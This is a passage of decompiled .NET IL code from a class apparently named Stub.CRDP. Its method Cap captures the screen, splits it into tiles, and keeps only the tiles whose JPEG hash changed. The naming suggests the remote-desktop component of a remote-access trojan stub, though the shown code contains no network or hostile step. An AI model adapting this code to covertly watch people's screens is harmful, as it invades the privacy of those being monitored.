    IL_0032:  nop
    IL_0033:  ret
  } // end of method CRDP::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method CRDP::.ctor

  .method public static uint8[]  Cap(int32 q,
                                     int32 co,
                                     int32 Qu) cil managed
  {
    // Code size       1675 (0x68b)
    .maxstack  5
    .locals init (uint8[] V_0,
             class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo V_1,
             class [System.Drawing]System.Drawing.Imaging.EncoderParameters V_2,
             class [System.Drawing]System.Drawing.Graphics V_3,
             int32 V_4,
             int32 V_5,
             class [System.Drawing]System.Drawing.Bitmap V_6,
             int32 V_7,
             class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap> V_8,
             class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point> V_9,
             class [mscorlib]System.Collections.Generic.List`1<int32> V_10,
             int32 V_11,
             int32 V_12,
             int32 V_13,
             class [System.Drawing]System.Drawing.Bitmap V_14,
             valuetype [System.Drawing]System.Drawing.Point V_15,
             string V_16,
             valuetype [System.Drawing]System.Drawing.Size V_17,
             class [mscorlib]System.IO.MemoryStream V_18,
             class [mscorlib]System.IO.MemoryStream V_19,
             int32 V_20,
             int32 V_21,
             int32 V_22,
             int32 V_23,
             int32 V_24,
             int32 V_25,
             int32 V_26,
             uint8[] V_27,
             class [System.Drawing]System.Drawing.Bitmap V_28,
             uint8[] V_29,
             class [System.Drawing]System.Drawing.Bitmap V_30,
             int32 V_31,
             int32 V_32,
             int32 V_33,
             valuetype [System.Drawing]System.Drawing.Rectangle V_34,
             class [mscorlib]System.IO.MemoryStream V_35,
             int32 V_36,
             valuetype [System.Drawing]System.Drawing.Point V_37,
             string[] V_38,
             int32 V_39,
             int32 V_40,
             valuetype [System.Drawing]System.Drawing.Size V_41,
             uint8[] V_42,
             valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<int32> V_43,
             bool V_44)
    IL_0000:  nop
    IL_0001:  ldloca.s   V_17
    IL_0003:  ldarg.0
    IL_0004:  call       valuetype [System.Drawing]System.Drawing.Size Stub.CRDP::QZ(int32)
    IL_0009:  call       valuetype [System.Drawing]System.Drawing.Point [System.Drawing]System.Drawing.Size::op_Explicit(valuetype [System.Drawing]System.Drawing.Size)
    IL_000e:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(valuetype [System.Drawing]System.Drawing.Point)
    IL_0013:  nop
    IL_0014:  ldloca.s   V_17
    IL_0016:  ldloca.s   V_17
    IL_0018:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_001d:  stloc.s    V_39
    IL_001f:  ldloca.s   V_39
    IL_0021:  call       instance string [mscorlib]System.Int32::ToString()
    IL_0026:  ldc.i4.1
    IL_0027:  ldloca.s   V_17
    IL_0029:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_002e:  stloc.s    V_40
    IL_0030:  ldloca.s   V_40
    IL_0032:  call       instance string [mscorlib]System.Int32::ToString()
    IL_0037:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_003c:  ldc.i4.1
    IL_003d:  sub.ovf
    IL_003e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Mid(string,
                                                                                          int32,
                                                                                          int32)
    IL_0043:  ldc.i4.0
    IL_0044:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_0049:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_004e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_0053:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0058:  nop
    IL_0059:  ldloca.s   V_17
    IL_005b:  ldloca.s   V_17
    IL_005d:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_0062:  stloc.s    V_40
    IL_0064:  ldloca.s   V_40
    IL_0066:  call       instance string [mscorlib]System.Int32::ToString()
    IL_006b:  ldc.i4.1
    IL_006c:  ldloca.s   V_17
    IL_006e:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_0073:  stloc.s    V_39
    IL_0075:  ldloca.s   V_39
    IL_0077:  call       instance string [mscorlib]System.Int32::ToString()
    IL_007c:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0081:  ldc.i4.1
    IL_0082:  sub.ovf
    IL_0083:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Mid(string,
                                                                                          int32,
                                                                                          int32)
    IL_0088:  ldc.i4.0
    IL_0089:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_008e:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0093:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_0098:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_009d:  nop
    IL_009e:  ldsfld     class [System.Drawing]System.Drawing.Bitmap Stub.CRDP::OM
    IL_00a3:  callvirt   instance valuetype [System.Drawing]System.Drawing.Size [System.Drawing]System.Drawing.Image::get_Size()
    IL_00a8:  stloc.s    V_41
    IL_00aa:  ldloca.s   V_41
    IL_00ac:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_00b1:  ldloca.s   V_17
    IL_00b3:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_00b8:  ceq
    IL_00ba:  ldc.i4.0
    IL_00bb:  ceq
    IL_00bd:  ldsfld     class [System.Drawing]System.Drawing.Bitmap Stub.CRDP::OM
    IL_00c2:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
    IL_00c7:  ldloca.s   V_17
    IL_00c9:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_00ce:  ceq
    IL_00d0:  ldc.i4.0
    IL_00d1:  ceq
    IL_00d3:  or
    IL_00d4:  ldsfld     int32 Stub.CRDP::oCo
    IL_00d9:  ldarg.1
    IL_00da:  ceq
    IL_00dc:  ldc.i4.0
    IL_00dd:  ceq
    IL_00df:  or
    IL_00e0:  ldsfld     int32 Stub.CRDP::oQu
    IL_00e5:  ldarg.2
    IL_00e6:  ceq
    IL_00e8:  ldc.i4.0
    IL_00e9:  ceq
    IL_00eb:  or
    IL_00ec:  stloc.s    V_44
    IL_00ee:  ldloc.s    V_44
    IL_00f0:  brfalse.s  IL_0120

    IL_00f2:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap> Stub.CRDP::OA
    IL_00f7:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::Clear()
    IL_00fc:  nop
    IL_00fd:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point> Stub.CRDP::OAA
    IL_0102:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::Clear()
    IL_0107:  nop
    IL_0108:  ldloca.s   V_17
    IL_010a:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_010f:  ldloca.s   V_17
    IL_0111:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_0116:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                    int32)
    IL_011b:  stsfld     class [System.Drawing]System.Drawing.Bitmap Stub.CRDP::OM
    IL_0120:  nop
    IL_0121:  ldarg.0
    IL_0122:  stsfld     int32 Stub.CRDP::oQ
    IL_0127:  ldarg.1
    IL_0128:  stsfld     int32 Stub.CRDP::oCo
    IL_012d:  ldarg.2
    IL_012e:  stsfld     int32 Stub.CRDP::oQu
    IL_0133:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::.ctor()
    IL_0138:  stloc.s    V_8
    IL_013a:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::.ctor()
    IL_013f:  stloc.s    V_9
    IL_0141:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap> Stub.CRDP::OA
    IL_0146:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Count()
    IL_014b:  ldc.i4.0
    IL_014c:  cgt
    IL_014e:  stloc.s    V_44
    IL_0150:  ldloc.s    V_44
    IL_0152:  brfalse.s  IL_019a

    IL_0154:  ldloc.s    V_8
    IL_0156:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap> Stub.CRDP::OA
    IL_015b:  callvirt   instance !0[] class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::ToArray()
    IL_0160:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::AddRange(class [mscorlib]System.Collections.Generic.IEnumerable`1<!0>)
    IL_0165:  nop
    IL_0166:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap> Stub.CRDP::OA
    IL_016b:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::Clear()
    IL_0170:  nop
    IL_0171:  ldloc.s    V_9
    IL_0173:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point> Stub.CRDP::OAA
    IL_0178:  callvirt   instance !0[] class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::ToArray()
    IL_017d:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::AddRange(class [mscorlib]System.Collections.Generic.IEnumerable`1<!0>)
    IL_0182:  nop
    IL_0183:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point> Stub.CRDP::OAA
    IL_0188:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::Clear()
    IL_018d:  nop
    IL_018e:  ldsfld     class [System.Drawing]System.Drawing.Bitmap Stub.CRDP::OM
    IL_0193:  stloc.s    V_14
    IL_0195:  br         IL_03ba

    IL_019a:  nop
    IL_019b:  ldloca.s   V_17
    IL_019d:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_01a2:  ldloca.s   V_17
    IL_01a4:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_01a9:  ldc.i4.1
    IL_01aa:  call       class [System.Drawing]System.Drawing.Image Stub.CRDP::Gd(int32,
                                                                                  int32,
                                                                                  bool)
    IL_01af:  castclass  [System.Drawing]System.Drawing.Bitmap
    IL_01b4:  stloc.s    V_14
    IL_01b6:  ldloca.s   V_17
    IL_01b8:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_01bd:  stloc.s    V_24
    IL_01bf:  ldloca.s   V_17
    IL_01c1:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_01c6:  stloc.s    V_22
    IL_01c8:  ldarg.1
    IL_01c9:  ldc.i4.1
    IL_01ca:  sub.ovf
    IL_01cb:  stloc.s    V_23
    IL_01cd:  ldc.i4.0
    IL_01ce:  stloc.s    V_21
    IL_01d0:  br         IL_03a8

    IL_01d5:  ldarg.1
    IL_01d6:  ldc.i4.1
    IL_01d7:  sub.ovf
    IL_01d8:  stloc.s    V_26
    IL_01da:  ldc.i4.0
    IL_01db:  stloc.s    V_25
    IL_01dd:  br         IL_038f

    IL_01e2:  ldloc.s    V_22
    IL_01e4:  conv.r8
    IL_01e5:  ldarg.1
    IL_01e6:  conv.r8
    IL_01e7:  div
    IL_01e8:  ldloc.s    V_21
    IL_01ea:  conv.r8
    IL_01eb:  mul
    IL_01ec:  conv.r8
    IL_01ed:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_01f2:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_01f7:  conv.ovf.i4
    IL_01f8:  stloc.s    V_31
    IL_01fa:  ldloc.s    V_24
    IL_01fc:  conv.r8
    IL_01fd:  ldarg.1
    IL_01fe:  conv.r8
    IL_01ff:  div
    IL_0200:  ldloc.s    V_25
    IL_0202:  conv.r8
    IL_0203:  mul
    IL_0204:  conv.r8
    IL_0205:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_020a:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_020f:  conv.ovf.i4
    IL_0210:  stloc.s    V_36
    IL_0212:  ldloc.s    V_24
    IL_0214:  conv.r8
    IL_0215:  ldarg.1
    IL_0216:  conv.r8
    IL_0217:  div
    IL_0218:  conv.r8
    IL_0219:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_021e:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0223:  conv.ovf.i4
    IL_0224:  stloc.s    V_33
    IL_0226:  ldloc.s    V_22
    IL_0228:  conv.r8
    IL_0229:  ldarg.1
    IL_022a:  conv.r8
    IL_022b:  div
    IL_022c:  conv.r8
    IL_022d:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0232:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0237:  conv.ovf.i4
    IL_0238:  stloc.s    V_32
    IL_023a:  ldloca.s   V_33
    IL_023c:  call       instance string [mscorlib]System.Int32::ToString()
    IL_0241:  ldstr      "."
    IL_0246:  callvirt   instance bool [mscorlib]System.String::Contains(string)
    IL_024b:  stloc.s    V_44
    IL_024d:  ldloc.s    V_44
    IL_024f:  brfalse.s  IL_026d

    IL_0251:  ldloc.s    V_33
    IL_0253:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_0258:  ldstr      "."
    IL_025d:  ldc.i4.m1
    IL_025e:  ldc.i4.0
    IL_025f:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0264:  ldc.i4.0
    IL_0265:  ldelem.ref
    IL_0266:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_026b:  stloc.s    V_33
    IL_026d:  nop
    IL_026e:  ldloca.s   V_32
    IL_0270:  call       instance string [mscorlib]System.Int32::ToString()
    IL_0275:  ldstr      "."
    IL_027a:  callvirt   instance bool [mscorlib]System.String::Contains(string)
    IL_027f:  stloc.s    V_44
    IL_0281:  ldloc.s    V_44
    IL_0283:  brfalse.s  IL_02a1

    IL_0285:  ldloc.s    V_32
    IL_0287:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_028c:  ldstr      "."
    IL_0291:  ldc.i4.m1
    IL_0292:  ldc.i4.0
    IL_0293:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0298:  ldc.i4.0
    IL_0299:  ldelem.ref
    IL_029a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_029f:  stloc.s    V_32
    IL_02a1:  nop
    IL_02a2:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_02a7:  stloc.s    V_35
    IL_02a9:  ldloca.s   V_34
    IL_02ab:  ldloc.s    V_36
    IL_02ad:  ldloc.s    V_31
    IL_02af:  ldloc.s    V_33
    IL_02b1:  ldloc.s    V_32
    IL_02b3:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(int32,
                                                                                       int32,
                                                                                       int32,
                                                                                       int32)
    IL_02b8:  nop
    IL_02b9:  ldloc.s    V_14
    IL_02bb:  ldloc.s    V_34
    IL_02bd:  ldloc.s    V_14
    IL_02bf:  callvirt   instance valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat [System.Drawing]System.Drawing.Image::get_PixelFormat()
    IL_02c4:  callvirt   instance class [System.Drawing]System.Drawing.Bitmap [System.Drawing]System.Drawing.Bitmap::Clone(valuetype [System.Drawing]System.Drawing.Rectangle,
                                                                                                                           valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
    IL_02c9:  stloc.s    V_30
    IL_02cb:  ldloca.s   V_34
    IL_02cd:  ldloc.s    V_36
    IL_02cf:  ldloc.s    V_31
    IL_02d1:  ldloc.s    V_33
    IL_02d3:  ldloc.s    V_32
    IL_02d5:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(int32,
                                                                                       int32,
                                                                                       int32,
                                                                                       int32)
    IL_02da:  nop
    IL_02db:  ldsfld     class [System.Drawing]System.Drawing.Bitmap Stub.CRDP::OM
    IL_02e0:  ldloc.s    V_34
    IL_02e2:  ldloc.s    V_14
    IL_02e4:  callvirt   instance valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat [System.Drawing]System.Drawing.Image::get_PixelFormat()
    IL_02e9:  callvirt   instance class [System.Drawing]System.Drawing.Bitmap [System.Drawing]System.Drawing.Bitmap::Clone(valuetype [System.Drawing]System.Drawing.Rectangle,
                                                                                                                           valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
    IL_02ee:  stloc.s    V_28
    IL_02f0:  ldloc.s    V_30
    IL_02f2:  ldloc.s    V_35
    IL_02f4:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
    IL_02f9:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                  class [System.Drawing]System.Drawing.Imaging.ImageFormat)
    IL_02fe:  nop
    IL_02ff:  ldloc.s    V_35
    IL_0301:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_0306:  stloc.s    V_27
    IL_0308:  ldloc.s    V_35
    IL_030a:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_030f:  nop
    IL_0310:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0315:  stloc.s    V_35
    IL_0317:  ldloc.s    V_28
    IL_0319:  ldloc.s    V_35
    IL_031b:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
    IL_0320:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                  class [System.Drawing]System.Drawing.Imaging.ImageFormat)
    IL_0325:  nop
    IL_0326:  ldloc.s    V_35
    IL_0328:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_032d:  stloc.s    V_29
    IL_032f:  ldloc.s    V_35
    IL_0331:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0336:  nop
    IL_0337:  ldloc.s    V_27
    IL_0339:  call       string Stub.CRDP::md5(uint8[])
    IL_033e:  ldloc.s    V_29
    IL_0340:  call       string Stub.CRDP::md5(uint8[])
    IL_0345:  ldc.i4.0
    IL_0346:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_034b:  ldc.i4.0
    IL_034c:  ceq
    IL_034e:  stloc.s    V_44
    IL_0350:  ldloc.s    V_44
    IL_0352:  brfalse.s  IL_035e

    IL_0354:  ldloc.s    V_30
    IL_0356:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
    IL_035b:  nop
    IL_035c:  br.s       IL_037f

    IL_035e:  nop
    IL_035f:  ldloc.s    V_8
    IL_0361:  ldloc.s    V_30
    IL_0363:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::Add(!0)
    IL_0368:  nop
    IL_0369:  ldloca.s   V_15
    IL_036b:  ldloc.s    V_36
    IL_036d:  ldloc.s    V_31
    IL_036f:  call       instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                   int32)
    IL_0374:  nop
    IL_0375:  ldloc.s    V_9
    IL_0377:  ldloc.s    V_15
    IL_0379:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::Add(!0)
    IL_037e:  nop
    IL_037f:  nop
    IL_0380:  ldloc.s    V_28
    IL_0382:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
    IL_0387:  nop
    IL_0388:  ldloc.s    V_25
    IL_038a:  ldc.i4.1
    IL_038b:  add.ovf
    IL_038c:  stloc.s    V_25
    IL_038e:  nop
    IL_038f:  ldloc.s    V_25
    IL_0391:  ldloc.s    V_26
    IL_0393:  cgt
    IL_0395:  ldc.i4.0
    IL_0396:  ceq
    IL_0398:  stloc.s    V_44
    IL_039a:  ldloc.s    V_44
    IL_039c:  brtrue     IL_01e2

    IL_03a1:  ldloc.s    V_21
    IL_03a3:  ldc.i4.1
    IL_03a4:  add.ovf
    IL_03a5:  stloc.s    V_21
    IL_03a7:  nop
    IL_03a8:  ldloc.s    V_21
    IL_03aa:  ldloc.s    V_23
    IL_03ac:  cgt
    IL_03ae:  ldc.i4.0
    IL_03af:  ceq
    IL_03b1:  stloc.s    V_44
    IL_03b3:  ldloc.s    V_44
    IL_03b5:  brtrue     IL_01d5

    IL_03ba:  nop
    IL_03bb:  ldloc.s    V_8
    IL_03bd:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Count()
    IL_03c2:  ldc.i4.0
    IL_03c3:  ceq
    IL_03c5:  stloc.s    V_44
    IL_03c7:  ldloc.s    V_44
    IL_03c9:  brfalse.s  IL_03e0

    IL_03cb:  ldc.i4.1
    IL_03cc:  newarr     [mscorlib]System.Byte
    IL_03d1:  stloc.s    V_42
    IL_03d3:  ldloc.s    V_42
    IL_03d5:  ldc.i4.0
    IL_03d6:  ldc.i4.0
    IL_03d7:  stelem.i1
    IL_03d8:  ldloc.s    V_42
    IL_03da:  stloc.0
    IL_03db:  br         IL_0689

    IL_03e0:  nop
    IL_03e1:  ldc.i4.0
    IL_03e2:  stloc.s    V_4
    IL_03e4:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<int32>::.ctor()
    IL_03e9:  stloc.s    V_10
    IL_03eb:  ldarg.1
    IL_03ec:  ldarg.1
    IL_03ed:  mul.ovf
    IL_03ee:  conv.r8
    IL_03ef:  ldc.r8     5.
    IL_03f8:  div
    IL_03f9:  conv.r8
    IL_03fa:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_03ff:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0404:  conv.ovf.i4
    IL_0405:  stloc.s    V_12
    IL_0407:  ldc.i4.0
    IL_0408:  stloc.s    V_5
    IL_040a:  br.s       IL_0445

    IL_040c:  ldloc.s    V_5
    IL_040e:  ldloc.s    V_8
    IL_0410:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Count()
    IL_0415:  ceq
    IL_0417:  stloc.s    V_44
    IL_0419:  ldloc.s    V_44
    IL_041b:  brfalse.s  IL_0420

    IL_041d:  nop
    IL_041e:  br.s       IL_0454

    IL_0420:  nop
    IL_0421:  ldloc.s    V_10
    IL_0423:  ldloc.s    V_5
    IL_0425:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<int32>::Add(!0)
    IL_042a:  nop
    IL_042b:  ldloc.s    V_4
    IL_042d:  ldloc.s    V_8
    IL_042f:  ldloc.s    V_5
    IL_0431:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Item(int32)
    IL_0436:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
    IL_043b:  add.ovf
    IL_043c:  stloc.s    V_4
    IL_043e:  ldloc.s    V_5
    IL_0440:  ldc.i4.1
    IL_0441:  add.ovf
    IL_0442:  stloc.s    V_5
    IL_0444:  nop
    IL_0445:  ldloc.s    V_5
    IL_0447:  ldloc.s    V_12
    IL_0449:  cgt
    IL_044b:  ldc.i4.0
    IL_044c:  ceq
    IL_044e:  stloc.s    V_44
    IL_0450:  ldloc.s    V_44
    IL_0452:  brtrue.s   IL_040c

    IL_0454:  ldloc.s    V_8
    IL_0456:  ldc.i4.0
    IL_0457:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Item(int32)
    IL_045c:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
    IL_0461:  ldloc.s    V_4
    IL_0463:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                    int32)
    IL_0468:  stloc.s    V_6
    IL_046a:  ldloc.s    V_6
    IL_046c:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
    IL_0471:  stloc.3
    IL_0472:  ldc.i4.0
    IL_0473:  stloc.s    V_20
    IL_0475:  ldloc.s    V_14
    IL_0477:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
    IL_047c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_0481:  ldstr      "."
    IL_0486:  ldloc.s    V_14
    IL_0488:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
    IL_048d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_0492:  ldstr      ","
    IL_0497:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_049c:  stloc.s    V_16
    IL_049e:  nop
    .try
    {
      IL_049f:  ldloc.s    V_10
      IL_04a1:  callvirt   instance valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<!0> class [mscorlib]System.Collections.Generic.List`1<int32>::GetEnumerator()
      IL_04a6:  stloc.s    V_43
      IL_04a8:  br         IL_0563

      IL_04ad:  ldloca.s   V_43
      IL_04af:  call       instance !0 valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<int32>::get_Current()
      IL_04b4:  stloc.s    V_11
      IL_04b6:  ldc.i4.7
      IL_04b7:  newarr     [mscorlib]System.String
      IL_04bc:  stloc.s    V_38
      IL_04be:  ldloc.s    V_38
      IL_04c0:  ldc.i4.0
      IL_04c1:  ldloc.s    V_16
      IL_04c3:  stelem.ref
      IL_04c4:  nop
      IL_04c5:  ldloc.s    V_9
      IL_04c7:  ldloc.s    V_11
      IL_04c9:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::get_Item(int32)
      IL_04ce:  stloc.s    V_37
      IL_04d0:  ldloc.s    V_38
      IL_04d2:  ldc.i4.1
      IL_04d3:  ldloca.s   V_37
      IL_04d5:  call       instance int32 [System.Drawing]System.Drawing.Point::get_X()
      IL_04da:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_04df:  stelem.ref
      IL_04e0:  nop
      IL_04e1:  ldloc.s    V_38
      IL_04e3:  ldc.i4.2
      IL_04e4:  ldstr      "."
      IL_04e9:  stelem.ref
      IL_04ea:  nop
      IL_04eb:  ldloc.s    V_9
      IL_04ed:  ldloc.s    V_11
      IL_04ef:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::get_Item(int32)
      IL_04f4:  stloc.s    V_15
      IL_04f6:  ldloc.s    V_38
      IL_04f8:  ldc.i4.3
      IL_04f9:  ldloca.s   V_15
      IL_04fb:  call       instance int32 [System.Drawing]System.Drawing.Point::get_Y()
      IL_0500:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0505:  stelem.ref
      IL_0506:  nop
      IL_0507:  ldloc.s    V_38
      IL_0509:  ldc.i4.4
      IL_050a:  ldstr      "."
      IL_050f:  stelem.ref
      IL_0510:  nop
      IL_0511:  ldloc.s    V_38
      IL_0513:  ldc.i4.5
      IL_0514:  ldloc.s    V_8
      IL_0516:  ldloc.s    V_11
      IL_0518:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Item(int32)
      IL_051d:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_0522:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0527:  stelem.ref
      IL_0528:  nop
      IL_0529:  ldloc.s    V_38
      IL_052b:  ldc.i4.6
      IL_052c:  ldstr      ","
      IL_0531:  stelem.ref
      IL_0532:  nop
      IL_0533:  ldloc.s    V_38
      IL_0535:  call       string [mscorlib]System.String::Concat(string[])
      IL_053a:  stloc.s    V_16
      IL_053c:  ldloc.3
      IL_053d:  ldloc.s    V_8
      IL_053f:  ldloc.s    V_11
      IL_0541:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Item(int32)
